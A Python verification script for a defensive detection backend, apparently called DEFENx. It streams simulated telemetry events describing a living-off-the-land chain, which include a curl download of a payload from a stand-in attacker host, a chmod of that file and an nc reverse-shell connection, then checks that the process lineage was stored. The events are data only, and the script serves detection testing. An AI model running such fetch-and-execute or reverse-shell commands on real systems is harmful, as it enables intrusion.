"""
Verification & Attack Simulation Suite for DEFENx.
Tests end-to-end telemetry ingestion, Isolation Forest scoring,
and Ollama AI forensic analysis without mock data.
"""

import asyncio
import json
import logging
import os
import sys
import websockets
from datetime import datetime, timezone
import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("defenx.simulation")

BACKEND_HTTP = "http://127.0.0.1:8000"
BACKEND_WS = "ws://127.0.0.1:8000/ws/agent?token=defenx-internal-local-token"

async def check_backend_health():
    """Validates that the FastAPI backend is running and reachable."""
    try:
        res = requests.get(f"{BACKEND_HTTP}/api/health", timeout=5)
        if res.status_code == 200:
            logger.info("DEFENx Backend is UP. System Health: %s", res.json())
            return True
    except Exception as e:
        logger.error("Backend health check failed: %v", e)
    return False

async def simulate_lotl_attack_chain():
    """
    Simulates a real Living-off-the-Land (LotL) attack chain by streaming
    sequential events directly through the authenticated WebSocket interface:
    Chain: bash (PID 4001) -> curl payload (PID 4002) -> chmod execution (PID 4003) -> reverse shell outbound connect
    """
    logger.info("Connecting to agent ingestion stream at %s...", BACKEND_WS)
    try:
        async with websockets.connect(BACKEND_WS) as ws:
            logger.info("Connected to DEFENx agent ingestion channel.")

            current_time = datetime.now(timezone.utc).isoformat()

            events = [
                {
                    "timestamp": current_time,
                    "event_type": "execve",
                    "pid": 4001,
                    "ppid": 1000,
                    "uid": 1000,
                    "comm": "bash",
                    "path": "/bin/bash",
                    "args": ["/bin/bash"],
                    "metadata": {}
                },
                {
                    "timestamp": current_time,
                    "event_type": "execve",
                    "pid": 4002,
                    "ppid": 4001,
                    "uid": 1000,
                    "comm": "curl",
                    "path": "/usr/bin/curl",
                    "args": ["curl", "-s", "http://malicious-c2.net/payload.sh"],
                    "metadata": {}
                },
                {
                    "timestamp": current_time,
                    "event_type": "execve",
                    "pid": 4003,
                    "ppid": 4001,
                    "uid": 1000,
                    "comm": "chmod",
                    "path": "/bin/chmod",
                    "args": ["chmod", "+x", "/tmp/payload.sh"],
                    "metadata": {}
                },
                {
                    "timestamp": current_time,
                    "event_type": "connect",
                    "pid": 4004,
                    "ppid": 4001,
                    "uid": 1000,
                    "comm": "nc",
                    "dest_ip": "198.51.100.42",
                    "dest_port": 4444,
                    "protocol": "TCP",
                    "metadata": {}
                }
            ]

            for ev in events:
                payload = json.dumps(ev)
                await ws.send(payload)
                logger.info("Transmitted event: [%s] PID=%d Comm=%s", ev["event_type"], ev["pid"], ev["comm"])
                await asyncio.sleep(0.5)

            logger.info("Simulation events successfully streamed to engine.")

    except Exception as e:
        logger.error("Failed to stream simulation events: %v", e)

async def verify_stored_lineage():
    """Queries the backend to verify that the historical process lineage was stored and assembled."""
    logger.info("Verifying historical lineage reconstruction for PID 4001...")
    try:
        res = requests.get(f"{BACKEND_HTTP}/api/telemetry/lineage/4001", timeout=5)
        if res.status_code == 200:
            data = res.json()
            events = data.get("events", [])
            logger.info("Retrieved %d events in lineage for PID 4001.", len(events))
            for e in events:
                logger.info("  -> PID %d (%s) - %s", e["pid"], e["comm"], e["event_type"])
            return len(events) > 0
    except Exception as e:
        logger.error("Error retrieving lineage: %v", e)
    return False

async def main():
    logger.info("=== Starting Phase 5: DEFENx Simulation & Verification Suite ===")
    healthy = await check_backend_health()
    if not healthy:
        logger.error("DEFENx backend is not active. Please start the backend before running simulations.")
        return

    await simulate_lotl_attack_chain()
    await asyncio.sleep(1)
    await verify_stored_lineage()
    logger.info("=== Phase 5 Simulation & Ingestion Check Completed ===")

if __name__ == "__main__":
    asyncio.run(main())
